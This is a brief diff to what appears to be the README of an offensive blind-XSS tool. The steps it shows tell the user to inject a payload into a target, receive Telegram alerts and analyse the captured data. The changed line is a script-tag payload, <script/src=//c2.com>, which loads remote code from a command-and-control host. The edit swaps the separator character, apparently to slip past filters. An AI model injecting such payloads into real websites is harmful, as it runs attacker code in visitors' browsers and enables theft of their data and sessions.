@@ -85,7 +85,7 @@
 3. **Inject** the payload into the target
 4. **Wait** for alert in your Telegram
 5. **Analyze** data via the dashboard
-6. ***<script+src=//c2.com></script>***
+6. ***<script/src=//c2.com></script>***
 
 ---
 
